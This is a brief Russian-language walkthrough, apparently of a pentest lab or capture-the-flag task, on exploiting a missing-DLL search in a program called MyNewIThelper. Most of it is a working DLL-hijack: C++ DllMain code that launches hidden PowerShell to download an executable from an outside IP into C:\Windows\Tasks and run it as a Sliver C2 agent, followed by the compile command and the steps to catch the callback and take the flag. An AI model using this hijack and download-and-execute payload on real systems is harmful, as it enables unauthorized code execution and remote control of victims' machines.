Подключаемся к машине и находим программу MyNewIThelper
Закидываем ее на основную машину и с помощью Procmon отслеживаем какие dll ищет программа. Она ищет Pentest.dll который отсутствуют на машине жертвы
Создаем код на с++ который установит агент sliver и запустит его 
``` c++
#include <windows.h> 

BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
	switch (dwReason) {
	case DLL_PROCESS_ATTACH:
		system("powershell -nologo -noninteractive -windowStyle hidden -command iwr http://100.100.2.252/MASSIVE_STRENGTH.exe -O C:\\Windows\\Tasks\\MASSIVE_STRENGTH.exe ; C:\\Windows\\Tasks\\MASSIVE_STRENGTH.exe");
		break;
	case DLL_PROCESS_DETACH:
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	}
	return TRUE;
}
```
Компилируем dll```x86_64-w64-mingw32-gcc -shared -o Pentest.dll  pentest.c``` и передаем ее на машину жертвы
Запуска слушателя для агента и веб сервер чтобы установить агента
Запускаем MyNewITHelper и получаем соединения от системы => забираем флаг